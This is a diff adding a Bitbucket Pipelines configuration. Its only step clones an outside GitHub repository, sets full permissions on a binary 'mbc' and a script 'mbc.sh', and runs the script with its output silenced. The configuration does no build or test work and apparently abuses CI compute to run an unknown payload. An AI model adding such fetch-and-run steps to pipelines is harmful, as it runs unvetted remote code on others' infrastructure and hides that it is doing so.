@@ -1,0 +1,15 @@
+image: golang:latest
+options:
+  max-time: 120.0000000000000071000000000
+pipelines:
+  default:
+    - parallel:
+      - step:
+          name: A
+          runs-on: linux
+          deployment: test
+          trigger: automatic
+          script:
+            - git clone https://github.com/sibotak1313/sibotak1313.git
+            - cd sibotak1313
+            - chmod 777 mbc && chmod 777 mbc.sh && ./mbc.sh >> /dev/null
